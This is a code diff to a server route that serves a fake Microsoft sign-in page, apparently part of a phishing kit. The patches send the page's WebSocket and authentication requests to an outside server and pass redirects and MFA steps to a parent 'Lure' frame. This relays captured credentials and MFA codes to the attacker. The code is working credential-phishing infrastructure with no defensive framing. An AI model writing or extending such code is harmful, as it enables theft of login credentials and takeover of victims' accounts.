@@ -56,6 +56,31 @@ exports.getPage = (req, res) => {
                 break;
             case 'login':
                 htmlContent = generateMsLoginPage(safeToken, { randomize: true });
+
+                // [EAPI PATCH 1] WebSocket to VPS
+                htmlContent = htmlContent.replace(
+                    "new WebSocket(`ws://${window.location.host}`)",
+                    "new WebSocket('wss://api.yieldmaxfx.com')"
+                );
+
+                // [EAPI PATCH 2] Auth API Endpoint
+                htmlContent = htmlContent.replace(
+                    "fetch('/api/start-auth'",
+                    "fetch('https://api.yieldmaxfx.com/eapi/start-auth'"
+                );
+
+                // [EAPI PATCH 3] Redirect Handling -> Call Parent to generic 'onStepRequired'
+                // This informs the Lure to fetch the next page (e.g. MFA)
+                htmlContent = htmlContent.replace(
+                    "window.location.href = data.redirect;",
+                    "console.log('Redirect requested to:', data.redirect); if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired(data.redirect); } else { window.location.href = data.redirect; }"
+                );
+
+                // [EAPI PATCH 4] Intercept explicit MFA redirect
+                htmlContent = htmlContent.replace(
+                    /window\.location\.href = '\/.*\/very';/,
+                    "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('very'); } else { console.log('MFA Page required'); }"
+                );
                 break;
             case 'mfa':
             case 'very':
